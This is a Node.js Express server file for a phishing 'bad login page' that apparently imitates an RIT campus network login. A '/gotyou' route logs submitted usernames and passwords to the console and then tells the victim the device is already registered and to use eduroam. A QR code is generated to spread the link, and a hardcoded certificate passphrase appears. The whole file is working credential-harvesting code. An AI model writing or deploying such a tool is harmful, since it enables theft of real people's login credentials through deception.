const express = require(`express`)
const path    = require(`path`)
const https   = require(`https`)
const http    = require(`http`)
const fs      = require(`fs`)

const ip        = require("ip")
const ADDRESS   = ip.address()
const PORT      = 80
const qrcode    = require('qrcode-terminal')

const credentials = { key: fs.readFileSync(`${__dirname}/keys/key.pem`), cert: fs.readFileSync(`${__dirname}/keys/cert.pem`), passphrase: 'abcdef'}

const app = express()

app.use(express.static(`${__dirname}/dist`))
app.get('/gotyou',(req,res)=>{
  const username = req.query?.username
  const pass     = req.query?.password
  if (username){
    console.log(`Got username ${username} & password ${pass}`)
  }
  res.end(`<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><html>Your device is already registered with RIT, please use eduroam</html>`);
})
app.get('/*',(req,res)=>{
  res.sendFile('./dist/index.html', {root: `${__dirname}`})
})

let normalServer = http.createServer(app)
let secureServer = https.createServer(credentials, app)

normalServer.listen(80,()=>{
  const link1 = `http://${ADDRESS}:${PORT}` 
  console.log(`\nStarted bad login page @${link1}\n`)
  qrcode.generate(link1,{small:true}, function (qrcode) {
      console.log(qrcode);
  })
})

secureServer.listen(443,()=>{
  console.log("Also listening for requests on port 443...")
})
